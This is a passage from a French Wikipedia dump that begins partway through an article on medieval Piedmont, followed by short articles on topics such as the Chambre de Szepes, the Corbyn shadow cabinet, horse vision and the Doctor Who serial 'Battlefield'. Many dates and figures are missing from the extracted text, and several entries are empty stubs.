Les fortifications de Demonte contraignent le sénéchal de Piémont et le sénéchal de Provence à unir leurs forces pour l'assiéger, mais la ville se rend dès le . En ce même mois de septembre, Charles II envoie en Piémont un renfort de 300 cavaliers et s'empare de Coni et des vallées voisines de cette ville.
Raymond-Béranger entretemps meurt, et le roi Charles II nomme son fils Robert, duc de Calabre, vicaire général des comtés de Provence et de Forcalquier. Celui-ci prend ses fonctions à Aix-en-Provence en mars 1306.
Le , le roi Charles II, ordonne à Raymond III des Baux-Orange, seigneur de Courthézon, Sénéchal de Piémont, de remettre le comté de Piémont à son fils Robert ou à ses procureurs et de lui faire prêter hommage et serment de fidélité par tous les marquis, comtes, barons et habitants de chaque ville de ce comté. Le , à Coni, le prince Robert ordonne à Raynal de Lecto, sénéchal de Provence et de Forcalquier, et à Raymond de Aquila, juge de la cour ducale, de prendre possession du comté de Piémont et de faire prêter le serment de fidélité à la commune de Coni et à la noblesse du pays.
Le contexte politique.
Les principautés féodales.
Le Piémont de la seconde moitié du et de la première moitié du est partagé entre :

</doc>
<doc id="9412258" url="https://fr.wikipedia.org/wiki?curid=9412258" title="Armorial des présidents de la Pologne">
Armorial des présidents de la Pologne

Les armoiries des présidents de la Pologne sont celles de leur famille ou ont été créées à l'admission du président au sein d'un ordre de chevalerie étranger. L'héraldique polonaise attribue un même blason à des centaines de familles différentes membres d'un même clan ("herb"), ce qui explique que presque tous aient possédé des armes familiales et que les mêmes blasons aient été portés par des présidents différents.
Armorial.
Pour la période 1939-1989, ne sont considérés que les présidents du Gouvernement en exil.

</doc>
<doc id="9412261" url="https://fr.wikipedia.org/wiki?curid=9412261" title="Chambre de Szepes">
Chambre de Szepes

La Chambre de Szepes ("Camera Scepusiensis" en latin ; "Szepesi Kamara" en hongrois ; "Die Zipser Kammer" en allemand ; "Spišská Komora" en slovaque) était une institution du royaume de Hongrie chargée des finances et de l'économie de la Haute-Hongrie. 
De 1539 à 1848, la Chambre détermine les impôts et les revenus royaux de toute la Haute-Hongrie, y compris pour le comté de Szepes, et les transmet à la Hofkammer de Vienne. 
Son siège est dans les premières années le château de Sáros, puis la ville d'Eperjes (Prešov en slovaque) avant de s'installer à Kassa (Košice en slovaque) en 1567 au 68 de la rue Hlavná.
Le bâtiment, à l'exception de l'aile la plus au nord, a été démoli en 1935 et remplacé par un bâtiment moderne destiné à la direction régionale des finances tchécoslovaque. Le , caché entre 1680 et 1682 aux rebelles Kuruc sous Imre Thököly, a été découvert dans les fondations en 1935 et était probablement constitué des biens d'un haut fonctionnaire de la chambre qui avait fui.
Historique.
Le prédécesseur de la Chambre de Szepes au Moyen Âge était la , dont l'activité est interrompue par l'occupation de la ville par Jean Ier Zapolya en 1536. La gestion financière et administrative de la partie orientale de la Hongrie depuis la Chambre de Hongrie ("Udvari Kamara") à Pozsony (Presbourg) était lente et difficile, notamment en raison de la complexité de l'évolution politique et de l'éloignement et des guerres ottomanes.
Dans ce contexte est créée en 1539 une nouvelle Chambre hongroise siégeant au château de Sáros, dont l'administrateur est alors le capitaine en chef de Sáros ("sárosi főkapitány") George Werner, conseiller royal et conseiller de la Chambre de Hongrie ("fl." 1536-1556). Ce dernier s'installe en 1555 à Prešov/Eperjes et porte le titre d'"Administrateur des revenus royaux de Haute-Hongrie" ("proventuum regiorum partium Regni Superiorum Administrator" en latin). À partir du milieu des années 1550, la Chambre est "de facto" indépendante de la Chambre de Hongrie de Pozsony qui ne déclarait plus les revenus de la Haute-Hongrie. En 1557, Werner est assisté notamment d'un trésorier et d'un greffier. La Chambre porte à partir de la même année le nom d'"Administration des revenus de la Haute-Hongrie" (en allemand : "Administration der oberungarischen Einkommen"). Après les batailles contre les Turcs et la Transylvanie en 1565/66, le capitaine en chef de Haute-Hongrie fait pression pour l'indépendance officielle de la fonction. C'est ainsi que la décision est prise en 1563 par Ferdinand (1526-1564) d'établir une administration séparée dans les parties orientales du pays qu'il installe à Kassa/Košice le 1er avril 1567. Son premier président est l'évêque de Csanad Gergely Bornemissza.
En 1571, la Chambre reçoit de nouvelles instructions détaillées pour ses activités, les présidents ("praefectus") devant être désormais des experts financiers issus de la noblesse. Depuis la fin des années 1570, la Chambre travaille de manière totalement indépendante de la Chambre de Hongrie, mais reste sous l'influence considérable du capitaine en chef de Haute-Hongrie. Après la défaite des Turcs à la fin du XVIIe siècle, des changements importants se produisent dans l'autorité, également territoriale, de l'Administration. La Chambre de Szepes cesse d'exister en 1848 à l'occasion de la création des ministères.

</doc>
<doc id="9412262" url="https://fr.wikipedia.org/wiki?curid=9412262" title="Don Félix Sardá y Salvany">
Don Félix Sardá y Salvany



</doc>
<doc id="9412267" url="https://fr.wikipedia.org/wiki?curid=9412267" title="Duc de Guyenne">
Duc de Guyenne



</doc>
<doc id="9412268" url="https://fr.wikipedia.org/wiki?curid=9412268" title="Kenan Şimşek">
Kenan Şimşek

Kenan Şimşek est un lutteur turc spécialiste de la lutte libre né le à Ordu.
Biographie.
Kenan Şimşek participe aux Jeux olympiques d'été de 1992 à Barcelone dans la catégorie des poids mi-lourds et remporte la médaille d'argent.

</doc>
<doc id="9412270" url="https://fr.wikipedia.org/wiki?curid=9412270" title="Pétronille de Lorraine">
Pétronille de Lorraine



</doc>
<doc id="9412282" url="https://fr.wikipedia.org/wiki?curid=9412282" title="Sacrée Congrégation de l'Index">
Sacrée Congrégation de l'Index



</doc>
<doc id="9412283" url="https://fr.wikipedia.org/wiki?curid=9412283" title="Heiko Balz">
Heiko Balz

Heiko Balz est un lutteur allemand spécialiste de la lutte libre né le à Burg bei Magdeburg.
Biographie.
Heiko Balz participe aux Jeux olympiques d'été de 1992 à Barcelone dans la catégorie des poids lourds et remporte la médaille d'argent.

</doc>
<doc id="9412284" url="https://fr.wikipedia.org/wiki?curid=9412284" title="Liste de peintures d'Eustache Le Sueur">
Liste de peintures d'Eustache Le Sueur

Cette page dresse la liste des peintures d'Eustache Le Sueur (1617-1655).

</doc>
<doc id="9412286" url="https://fr.wikipedia.org/wiki?curid=9412286" title="Akin Mabogunje">
Akin Mabogunje

Akinlawon Ladipo Mabogunje, né le et mort le à Lagos, est un géographe nigérian, spécialiste de l'urbanisation dans les pays en développement et d'aménagement urbain. 
Il est le premier président africain de l'Union géographique internationale (1980-1984) et le premier lauréat africain du prix Vautrin-Lud (2017).
Biographie.
Akin Mabogunje a étudié à l'université d'Ibadan (Nigeria) puis à l'University College de Londres où il obtient une licence de géographie.
Il a principalement enseigné à l'université d'Ibadan mais a assuré des enseignements dans différentes universités britanniques, suédoises, brésiliennes et américaines.
Akin Mabogunje a également travaillé pour divers services publics nigérians ou organisations internationales, notamment comme président de la "Western State Forestry Commission" (1968-74), président du "National Council for Management Development" (1976-79), consultant pour la Banque mondiale et le programme des Nations unies pour le développement.
Il préside l'Union géographique internationale et, en 1999, est le premier Africain à être élu en tant que membre étranger associé à l'Académie nationale des sciences des États-Unis. Il est aussi membre correspondant honoraire de l'Académie royale des sciences d'outre-mer, Classe des sciences humaines.
Actif au sein de l'Union géographique internationale, il en est par trois fois vice-président puis en est élu président pour la période 1980-1984.

</doc>
<doc id="9412287" url="https://fr.wikipedia.org/wiki?curid=9412287" title="Fuite mémoire">
Fuite mémoire



</doc>
<doc id="9412289" url="https://fr.wikipedia.org/wiki?curid=9412289" title="Astrid Frémont">
Astrid Frémont



</doc>
<doc id="9412290" url="https://fr.wikipedia.org/wiki?curid=9412290" title="Zoé Prieur">
Zoé Prieur



</doc>
<doc id="9412293" url="https://fr.wikipedia.org/wiki?curid=9412293" title="Commicarpus raynalii">
Commicarpus raynalii



</doc>
<doc id="9412295" url="https://fr.wikipedia.org/wiki?curid=9412295" title="Grand Prix d'été de combiné nordique 2000">
Grand Prix d'été de combiné nordique 2000

L'édition 2000 du Grand Prix d'été de combiné nordique s'est déroulée du au , en 4 épreuves disputées sur quatre sites différents. Elle a été remportée par l'Autrichien Felix Gottwald.
Les épreuves ont commencé en Allemagne, à Klingenthal, et se sont poursuivies, pour la deuxième épreuve, à Oberhof et Steinbach-Hallenberg. La troisième épreuve a eu lieu en Autriche, à Stams, et la quatrième à nouveau en Allemagne, à Berchtesgaden. Le , la victoire de Samppa Lajunen fur la première victoire finlandaise de l'histoire de la compétition.

</doc>
<doc id="9412301" url="https://fr.wikipedia.org/wiki?curid=9412301" title="Mehdi Boundjema">
Mehdi Boundjema

Mehdi Boundjema (en ), né le à Annonay, est un joueur international algérien de rugby à XV qui évolue au poste de talonneur.
Biographie.
Carrière en club.
Mehdi Boundjema né le à Annonay, commence le rugby à l'âge de neuf ans au Valence sportif, avant d'intégrer en 2007 le FC Grenoble pour parfaire sa formation.
Le , il fait ses débuts en pro lors du match de Pro D2 face à Oyonnax.
Après cinq saisons passé au FC Grenoble, à l'intersaison 2012, il signe pour deux saisons à la Section paloise en Pro D2. Lors de la saison 2012-2013, il se révèle, jouant vingt matchs, dont la finale d'accession contre le CA Brive. En , il prolonge son contrat avec le club béarnais et paraphe un contrat d'un an, assorti d'une saison supplémentaire.
Lors de la saison 2014-2015, il participe activement à la remontée du club en Top 14 avec un titre de champion de France de Pro D2.
Le , il dispute son premier match de Top 14 avec les palois, contre le FC Grenoble.
Le , il prend la direction de l'Aude où il signe un contrat de deux ans avec le RC Narbonne en Pro D2.
Le , il signe au Soyaux Angoulême XV en Pro D2, en tant que joker médical.
Début , il signe un contrat d'une durée de deux ans avec le Sporting club albigeois en Nationale.
Pour la saison 2021-2022, il signe un contrat d'une durée de deux ans avec le Valence Romans DR en Nationale.
En 2023 il fait son retour au RC Narbonne où il passe deux saisons avant de quitter le club.
Carrière internationale.
Mehdi Boundjema a honoré sa première cape internationale avec l'équipe d'Algérie le lors d'un test-match contre la Côte d'Ivoire, à Toulouse en France. Le XV aux deux Lions s'impose .
Il est rappelé à l'intersaison 2022 par la sélection algérienne afin de disputer la phase finale de la Coupe d'Afrique, faisant office de tournoi qualificatif de la zone Afrique pour la Coupe du monde 2023.
Le , il rentre à la de jeu à la place de Issam Hamel et inscrit son premier essai international contre le Sénégal pour le premier match des phases finales de la Coupe d'Afrique, à Aix-en-Provence en France, victoire de l'Algérie .
Il entre de nouveau en jeu pour de la demi-finale contre le Kenya le , défaite .
Le , il est titulaire contre le Zimbabwe pour le match pour la troisième place, victoire .
Pour sa première participation à la Coupe d'Afrique, l'Algérie termine troisième.

</doc>
<doc id="9412309" url="https://fr.wikipedia.org/wiki?curid=9412309" title="Cabinet fantôme Corbyn">
Cabinet fantôme Corbyn

Le cabinet fantôme Corbyn (en ) est le cabinet fantôme britannique nommé par le chef de l'opposition Jeremy Corbyn. Il est constitué par des députés du Parti travailliste. Il fait face au gouvernement conservateur de David Cameron puis, à partir de , à celui de Theresa May et depuis à celui de Boris Johnson. Il est remplacé en par le cabinet fantôme Starmer.
Historique.
À la suite des élections générales de mai 2015 qui voient le Parti conservateur remporter une majorité absolue des sièges à la Chambre des communes, Ed Miliband démissionne de la direction du Parti travailliste.
Élu le 12 septembre 2015, Jeremy Corbyn lui succède en tant que chef du Parti travailliste et chef de l'opposition alors que Tom Watson devient chef adjoint.
Issu de l'aile gauche du parti, Corbyn est contesté par une partie des députés plus centristes mais s'efforce de constituer un premier cabinet fantôme en s'appuyant sur des députés de différents courants. La moitié des ministres fantômes sont des femmes.
Toutefois, une rébellion est organisée parmi les députés travaillistes à partir du , au lendemain du référendum sur l'appartenance du Royaume-Uni à l'Union européenne remporté par l'option de la sortie alors que le Parti travailliste préconisait le maintien. Hilary Benn, le secrétaire d'État fantôme aux Affaires étrangères, est renvoyé du cabinet fantôme par Corbyn pour avoir participé aux préparatifs de la rébellion. Alors que de nombreux députés sont insatisfaits de la campagne référendaire menée par Corbyn et craignent de perdre leur siège si des élections anticipées sont convoquées, la rébellion prend de l'ampleur : en plusieurs jours, la majorité des membres du cabinet fantôme démissionne et une motion de défiance est adopté par le parti parlementaire.
Le , Angela Eagle lance une campagne afin de remplacer Jeremy Corbyn en annonçant avoir le nombre nécessaire de soutiens parmi les députés pour déclencher une nouvelle élection à la direction du parti. Elle se retire finalement en faveur d'Owen Smith. L'élection a lieu sur plusieurs semaines, et débouche le sur une large réélection de Jeremy Corbyn à la tête du parti, avec 61,8 % des voix.
Composition initiale.
Les membres nommés au cabinet fantôme les 13 et sont les suivants.
Changements ultérieurs.
Remaniements ponctuels.
Le , Jeremy Corbyn limoge Michael Dugher, secrétaire d'État fantôme à la Culture, pour l'avoir critiqué en public. Maria Eagle, jusque-là ministre fantôme de la Défense, le remplace à la Culture, et est elle-même remplacée par Emily Thornberry. Cette dernière, à l'inverse de Maria Eagle, soutient la position de Corbyn, en opposition au maintien de l'arsenal nucléaire britannique. Pat McFadden, ministre fantôme aux questions européennes, est limogé pour « incompétence et manque de loyauté » ; Pat Glass lui succède. Emma Lewell-Buck est nommé ministre fantôme à la Dévolution et au Gouvernement local. Le cabinet fantôme compte dès lors dix-sept femmes et quatorze hommes.
Crise de juin et juillet 2016.
Le , les Britanniques votent par référendum pour quitter l'Union européenne. Le , Hilary Benn, ministre fantôme des Affaires étrangères, accuse Jeremy Corbyn de ne s'être pas suffisamment investi dans la campagne pour le maintien du Royaume-Uni dans l'UE. Il lui annonce qu'il n'a plus confiance en sa direction du parti, contraignant ainsi Corbyn à le renvoyer. Le lendemain, la ministre fantôme de la Santé, Heidi Alexander, démissionne du cabinet fantôme et appelle le parti à changer de dirigeant. Dans le courant de la journée, Lucy Powell (Éducation), Vernon Coaker (Affaires nord-irlandaises), Ian Murray (Affaires écossaises), Kerry McCarthy (Environnement), Seema Malhotra (Trésor public), Lilian Greenwood (Transports) et Gloria De Piero (Jeunesse) démissionnent également, tandis que John McDonnell (Chancelier), Andy Burnham (Intérieur), Diane Abbott (Développement international) et Emily Thornberry (Défense) réaffirment leur confiance en Jeremy Corbyn. Angela Eagle, Première secrétaire d'État fantôme, annonce également vouloir contraindre le parti à de nouvelles élections internes moins d'un an avant les précédentes. Elle pose sa candidature contre Corbyn et quitte donc le cabinet également.
Le , à la suite de ces démissions, Jeremy Corbyn nomme le cabinet fantôme suivant, ajusté au fil de nouveaux départs durant la journée, puis complété début juillet pour les postes restés vacants :
Nouveau Cabinet en octobre 2016.
Défié par une majorité des députés travaillistes, Jeremy Corbyn est largement réélu chef par les membres du parti lors d'un scrutin qui se termine le 21 septembre 2016. Il constitue son nouveau Cabinet fantôme le . L'un des principaux changements est la démission d'Andy Burnham du poste de ministre fantôme de l'Intérieur : fidèle à Jeremy Corbyn malgré leurs divergences, il quitte le Parlement pour briguer la mairie de Manchester. Diane Abbott, figure de l'aile gauche du parti, lui succède.
Démissions début 2017.
Fin janvier, Jeremy Corbyn ordonne aux députés travaillistes d'approuver le projet de loi permettant au gouvernement d'enclencher le processus de sortie du Royaume-Uni de l'Union européenne. Corbyn explique que, bien qu'étant personnellement opposé au « Brexit », il estime que le parti doit accepter la volonté populaire telle qu'exprimée par le référendum de juin 2016. Jo Stevens, ministre fantôme pour le pays de Galles, démissionne alors du cabinet fantôme le . Elle est suivie le février par Rachael Maskell, ministre fantôme de l'Environnement, puis le par Clive Lewis, ministre fantôme du Commerce.
Les trois ministres fantômes démissionnaires sont remplacés respectivement par Christina Rees, Sue Hayman et Rebecca Long-Bailey. Cette dernière quitte ainsi son poste de Secrétaire en chef du Trésor du cabinet fantôme, où elle est remplacée par Peter Dowd
Léger remaniement en juin 2017.
Sous la direction de Jeremy Corbyn, le Parti travailliste obtient un bien meilleur résultat que prévu lors des élections législatives anticipées le 8 juin 2017, remportant trente sièges de plus qu'en 2015 et ne terminant que deux points derrière les conservateurs, avec 40 % des voix contre 42 %. Jeremy Corbyn ajuste son Cabinet fantôme le . Dave Anderson, Ministre fantôme pour l'Écosse et pour l'Irlande du Nord, n'ayant pas souhaité être candidat pour conserver son siège de député aux élections législatives, ses deux portefeuilles sont attribués respectivement à Lesley Laird et à Owen Smith. Et Teresa Pearce ayant démissionné, son poste de Ministre fantôme aux Communautés et au Gouvernement local est attribué à Andrew Gwynne, le coordinateur de la campagne électorale travailliste lors des législatives.

</doc>
<doc id="9412314" url="https://fr.wikipedia.org/wiki?curid=9412314" title="Olivier Culmann">
Olivier Culmann

Olivier Culmann (né le dans le XVe arrondissement de Paris) est un photographe français. Il est lauréat 1997 de la Villa Médicis hors les murs; lauréat 2003 du prix Scam Roger-Pic ; lauréat 2004 du Fujifilm Euro Press Photo ; désigné au World Presse de 2007 comme étant le troisième meilleur photographe du monde dans la catégorie "sujets contemporains" ; il est aussi le lauréat 2017 du prestigieux prix Niépce.
Membre depuis 1996 du collectif Tendance Floue, il vit à Montreuil.
Biographie.
Né dans le XVe arrondissement de Paris, Olivier Culmann étudie la photographie à l'ESRA. Il cite parmi ses influences la photographie humaniste (notamment Henri Cartier-Bresson) même si progressivement, l'esprit de ses images emprunte davantage à l'humour de Buster Keaton ("« l’homme qui ne riait jamais »"), à Arthur Penn (Little Big Man) ou à la bande-dessinée (Jean-Jacques Sempé, Jean-Marc Reiser).
À la fin des années 2000, il passe plusieurs années en Inde, pays qui revient régulièrement dans ses séries.
Ses photographies, à travers des séries effectuées sur la durée interrogent, sur le fil du dérisoire et de l'absurde, et avec une objectivité revendiquée, le conditionnement des individus et la remise en question des normes dogmatiques ou esthétiques.
Sa première série "Les Mondes de l'école" (réalisée avec Mat Jacob entre 1993 et 1996) explore via une approche documentaire en noir et blanc les attitudes d'écoliers à travers le monde, entre obéissance et ennui.
Avec "Une vie de poulet" (Filigranes, 2001), sa démarche documentaire intègre plus ouvertement l’humour à la narration, mettant en regard deux reportages effectués séparément, l’un sur la vie de poulets industriels, l’autre sur celle des derniers conscrits français, quelques mois avant la suppression du service militaire obligatoire.
Son travail se concentre ensuite sur l’observation et des postures, plus ou moins passives, de regardeurs qu’ils soient passants (ou touristes) de Ground zero les semaines suivant le (Série "Autour"), ou simples téléspectateurs de plusieurs continents photographiés chez eux dans "Watching TV", "constat de l’état des corps et des âmes face aux échos du monde filtrés par les écrans". "Watching TV" rencontre un large écho médiatique.
À partir de 2010, il formalise une recherche sur les modes de représentation de soi. Passionné par l’imagerie populaire et vernaculaire, ainsi que par les codes de mise en scène photographique, il s'introduit dans ses images pour mieux explorer les fantasmes sociaux et ses propres interrogations sur l’altérité.
Ses derniers travaux personnels ont recours de manière croissante à l’autoportrait, qu'il propose parfois à d'autres artistes de réinterpréter comme dans "The Others" (série qui fera l'objet, à partir d', d'une exposition au musée Nicéphore-Niépce à Chalon-sur-Saône.)
Collaborations presse et autres.
Il travaille régulièrement pour la presse ("L'Express", "Le Monde", "le Monde 2", "Géo", "Libération"...)
Il a coréalisé avec Pascal Dupont le film documentaire "Une histoire nécessaire", (54 min, 2001, Diffusion France 3), autour de la quête des origines.

</doc>
<doc id="9412318" url="https://fr.wikipedia.org/wiki?curid=9412318" title="Barboure">
Barboure

La Barboure est une rivière française du département de la Meuse, en région Grand Est, et un affluent droit de l'Ornain, c'est-à-dire un sous-affluent de la Seine par la Saulx et la Marne.
Géographie.
De , la Barboure prend sa source sur la commune de Naives-en-Blois, à la source du Franois, à . Elle s'appelle aussi dans cette partie haute le ruisseau des Lochères.
Elle coule globalement vers l'ouest et conflue sur la commune de Naix-aux-Forges, à , juste après être passé sous le pont-canal de la Barboure du canal de la Marne au Rhin.
Les cours d'eau voisins sont l'Ornain à l'ouest et le canal de la Marne au Rhin au sud, la Meuse au nord-est et l'Aire au nord,
Communes et cantons traversés.
Dans le seul département de la Meuse, la Barboure traverse les six communes suivantes, dans le sens amont vers aval, de Naives-en-Blois (source), Bovée-sur-Barboure, Reffroy, Marson-sur-Barboure, Boviolles, Naix-aux-Forges (confluence).
Soit en termes de cantons, la Barboure traverse deux cantons, prend source dans le canton de Vaucouleurs, conflue dans le canton de Ligny-en-Barrois, le tout dans les arrondissements de Commercy et de Bar-le-Duc.
Toponymes.
La Barboure a donné son hydronyme aux deux communes : Marson-sur-Barboure, Bovée-sur-Barboure.
Hydronymie.
Du gaulois "*barb" « bourbe ».
Bassin versant.
La superficie du bassin versant "La Barboure de sa source au confluent de l'Ornain (exclu)" (F565) est de . Le bassin versant est composé à de , à de , et à de .
Affluents.
La Barboure a deux tronçons affluents référencés :
Le rang de Strahler est donc de deux.

</doc>
<doc id="9412321" url="https://fr.wikipedia.org/wiki?curid=9412321" title="Barboure (homonymie)">
Barboure (homonymie)



</doc>
<doc id="9412332" url="https://fr.wikipedia.org/wiki?curid=9412332" title="Juzbado">
Juzbado

Juzbado est une commune de la province de Salamanque dans la communauté autonome de Castille-et-León en Espagne.
Économie.
En 1985, l'entreprise publique Enusa a installé à Juzbado une usine de fabrication de combustibles nucléaires. Son activité comprend la fourniture de matières premières et son traitement jusqu'à l'obtention de combustible qui est utilisé dans les centrales nucléaires espagnoles, ainsi que dans des centrales dans d'autres pays comme l'Allemagne et la Russie.

</doc>
<doc id="9412336" url="https://fr.wikipedia.org/wiki?curid=9412336" title="Vision du cheval">
Vision du cheval

La vision du cheval est un sens essentiel chez cette espèce animale, permettant à la fois la communication et le repérage de ses prédateurs. L'œil du cheval est ainsi l'un des plus grands parmi les animaux terrestres. Placés latéralement et saillants sur la tête, ces yeux n'ont pas de fovea, mais deux zones de perception précises, des cônes, des bâtonnets et un tapetum lucidum. La pupille horizontale offre une vision panoramique. Les yeux du cheval ont également la particularité de posséder des "corpora nigra", dits « grains de suie », très richement irrigués. Ils ont peut-être un rôle dans l’oxygénation du segment antérieur de l’œil, ou contre l'éblouissement dû aux rayons solaires.
Perception des couleurs.
Contrairement à une légende répandue, le cheval ne voit pas en noir et blanc puisqu'il possède suffisamment de cônes pour une vision des couleurs. La perception des couleurs est cependant dichromatique : il ne distingue pas le vert du rouge quand leurs luminosités ont été égalisées. Le cheval ne perçoit pas le rouge.
Particularités.
Les chevaux aux yeux bleus sont plus susceptibles de développer un carcinome spinocellulaire que les chevaux aux yeux foncés, en revanche la fréquence des autres types de maladies oculaires est comparable.
Maladies et troubles de l’œil.
L'utilisation sportive des chevaux demande une fonction visuelle optimale, et constitue donc un motif fréquent de consultation vétérinaire. En raison de la position de l’œil sur la tête et de sa taille, celui-ci est en effet très vulnérable aux traumatismes externes. Un problème de vue peut entraîner des troubles comportementaux. 

</doc>
<doc id="9412343" url="https://fr.wikipedia.org/wiki?curid=9412343" title="MANIAC I">
MANIAC I



</doc>
<doc id="9412344" url="https://fr.wikipedia.org/wiki?curid=9412344" title="MANIAC II">
MANIAC II



</doc>
<doc id="9412347" url="https://fr.wikipedia.org/wiki?curid=9412347" title="MANIAC III">
MANIAC III



</doc>
<doc id="9412350" url="https://fr.wikipedia.org/wiki?curid=9412350" title="Lilianne Ploumen">
Lilianne Ploumen

Elisabeth Maria Josepha Ploumen, dite Lilianne Ploumen, née le à Maastricht, est une femme politique néerlandaise, membre du Parti travailliste (PvdA), qu'elle dirige du au . Siégeant à la Seconde Chambre du au , elle est ministre du Commerce extérieur et de la Coopération pour le développement dans le deuxième cabinet de Mark Rutte du au .
Biographie.
Jeunesse et études.
Diplômée de l'université Érasme de Rotterdam, Lilianne Ploumen adhère dans sa jeunesse à la Gauche verte, puis au Parti travailliste en 2003.
Ministre sous Mark Rutte.
Ploumen est ministre du Commerce extérieur et de la Coopération pour le développement, un poste de ministre sans portefeuille au sein du ministère des Affaires étrangères, entre le et le , dans le deuxième cabinet de Mark Rutte.
Elle est auparavant présidente du Parti travailliste du au , une fonction d'importance moindre que celle de chef politique, qu'elle occupe depuis le , à la suite de la démission de Lodewijk Asscher.
Direction du Parti travailliste.
Lilianne Ploumen devient présidente du groupe parlementaire à la Seconde Chambre le , succédant à Lodewijk Asscher, sous qui elle est vice-présidente de groupe. Elle est proposée à la direction du parti par ses cadres le et investie dans ses fonctions par les adhérents cinq jours plus tard, à deux mois des élections législatives.
Elle mène la liste travailliste aux élections législatives du , à laquelle les sondages prédisent un redressement par rapport aux neuf sièges obtenus en 2017. Cependant, le parti n'arrive pas à confirmer les bonnes tendances sondagières, les travaillistes restant stables avec neuf élus à la suite du scrutin.
Le , Lilianne Ploumen démissionne de la direction du parti et annonce son retrait de la vie politique.

</doc>
<doc id="9412356" url="https://fr.wikipedia.org/wiki?curid=9412356" title="Battlefield (Doctor Who)">
Battlefield (Doctor Who)

 ("Champ de bataille") est le premier épisode de la de la première série de "Doctor Who". L'épisode fut diffusé en quatre parties du 6 au 27 septembre 1989.
Accroche.
Des chevaliers venus d'un univers parallèle arrivent sur Terre dans le but de trouver la légendaire épée Excalibur ainsi que le Roi Arthur. Seul le Docteur et Ace aidés du Brigadier Lethbridge-Stewart et d'une nouvelle équipe d'UNIT tentent de les contrer.
Résumé.
Répondant à un signal de détresse, le Docteur et Ace matérialisent le TARDIS non loin du lac Vortigern en Angleterre. Des explosions semblent avoir lieu dans la région et le Docteur se retrouve face au Brigadier Bambera d'UNIT chargé de l'affaire. Tous se retrouvent au Gore Crow Hotel, un établissement dirigée par une femme aveugle, où Ace rencontre, Shou Yuing, une jeune fille qui partage son engouement pour les explosifs. Sur le mur de l'hôtel se trouve un fourreau qui intrigue le Docteur et celle-ci se met à brûler à son toucher. Warmsly, un archéologue travaillant sur des fouilles non loin explique que le fourreau date du , mais le Docteur sans qu'elle est plus vieille que cela et qu'elle semble attendre quelque chose. 
Un soldat en armure s'écrase sur le toit de la brasserie attenante à l'hôtel. Accourant sur place, le Docteur, Ace et Shou Yuing y trouvent Ancelyn, un chevalier venu d'une autre dimension et identifiant le Docteur comme étant Merlin. Un groupe d'autres chevaliers, ennemis, les encerclent, conduit par Mordred, le fils de Morgaine et l'ennemi d'Ancelyn. Il est effrayé de voir "Merlin" et se retire avec ses troupes. Peu de temps après, Morgaine arrive sur Terre. Le lendemain, Warmsly montre au Docteur l'endroit où il a trouvé le fourreau et le Docteur aperçoit une pierre, écrit de sa main, sur laquelle est écrit "creusez ici." Il demande à Ace de faire exploser le terrain ce qui permet la découverte d'un tunnel s'enfonçant jusque sous le lac.
Pendant ce temps là, le Brigadier Lethbridge-Stewart, alors à la retraite, est appelé par ses supérieurs car le Docteur est réapparu. Un soldat vient le prendre en hélicoptère, mais tous deux finissent par s'écraser, l'hélicoptère ayant atteint par un sort de Morgaine. Il la rencontre alors à Carbury, alors que celle-ci mène une cérémonie, ce qui offre une trêve temporaire au cours de laquelle elle n'a pas le droit de le tuer. Sous le lac, le Docteur et Ace entrent dans une chambre qui ne s'ouvre par la voix du Docteur, reconnu comme étant Merlin. Ils se retrouvent dans un vaisseau organique où ils trouvent le corps du Roi Arthur ainsi qu'Excalibur. Un mécanisme de défense se met en place et Ace réussi à s'enfuir en sortant du lac, tandis que le Docteur est sauvé par le Brigadier Lethbridge-Stewart.
Pendant ce temps, Morgaine et Mordred arrivent à la taverne. Après avoir récupéré des informations dans la tête du soldat d'UNIT qui accompagnait le Brigadier et l'avoir tué, Morgaine paye les verres bus par son fils en rendant la vue de la propriétaire. Après leur départ, UNIT évacue les lieux et le Docteur parvient à hypnotiser Warmsly et le tavernier pour qu'il accepte de partir. À bord de Bessie, le Docteur et le Brigadier se rendent sur le champ de bataille où les soldats d'UNIT et les chevaliers de Mordred se battent. Alors que le Docteur tente de les stopper, Mordred se vante qu'il s'agit d'une mise en scène afin de gagner du temps.
À l'auberge, Ace et Shou Yuing, dans un cercle tracé à la craie, tentent de protéger Excalibur des sorcelleries de Morgaine. Celle-ci envoie une créature nommée "le Destructeur" mais il ne peut agir car enfermé par de lourdes chaînes en argent. Ace finit par donner Excalibur à Morgaine, qui fait exploser la taverne et repart dans une autre dimension avec le Destructeur. Ils laissent derrière eux un portail que le Docteur, Ace et le Brigadier traversent. Ace réussit à récupérer Excalibur, tandis que le Brigadier les envoie en arrière pendant qu'il tire sur le Destructeur avec des balles en argent ce qui a pour effet de le faire exploser. Le Brigadier sort pourtant vivant des décombres.
Près du lac, Morgaine prend en otage Bambera et la force à activer le missile nucléaire. Le Docteur réussit toutefois à lui faire annuler la procédure en lui expliquant que le Roi Arthur est mort et qu'elle tente en vain de le battre dans un combat où il est mort depuis longtemps. L'épisode se finit chez le Brigadier avec Ancelyn et le Docteur qui l'aide tandis qu'Ace, Shou Yuing, Bambera et la femme du Docteur partent faire du shopping en utilisant Bessie.
Production.
Écriture.
En arrivant dans l'équipe de production de la série, en 1987, le scénariste Ben Aaronovitch avait proposé un épisode qui mélangerait de l'héroïc fantasy type sword and sorcery et éléments modernes. S'inspirant des légendes Arthuriennes, il développe l'idée d'un affrontement entre puissances magiques extra-terrestres et des militaires. À l'été 1987, le producteur de la série, John Nathan-Turner lui propose d'inclure l'unité fictive UNIT et Aaronovitch songe alors à réintroduire le personnage du Brigadier Lethbridge-Stewart qui n'était pas réapparu depuis l'épisode de 1983 "The Five Doctors". Toutefois à l'automne, le script-editor (responsable des scénarios) de la série, Andrew Cartmel lui demande d'écrire le scénario d'un épisode avec les Daleks qui deviendra "Remembrance of the Daleks".
Au printemps 1988, Aaronovitch revient sur son scénario qui devient “Storm Over Avallion” () ou “Lake Over Avallion” () Il reprend plusieurs la légende Arthurienne voient leur noms changer : Morgane devient Morgaine, Arthur devient A'tur, les bretons deviennent les Br'tons et seul Mordred et l'épée Excalibur gardent leur noms. Dans le scénario original A'tur devait revenir dans la dernière partie. Le personnage d'Ancelyn est librement inspiré de Lancelot tandis que le prénom du Brigadier Bambera, Winifred, s'inspire librement de Guenièvre. À l'origine, celle-ci devait être une militaire américaine avant que l'épisode ne la rattache à UNIT. La localité de Carbury s'inspire librement de celle de Cadbury dans le Somerset.
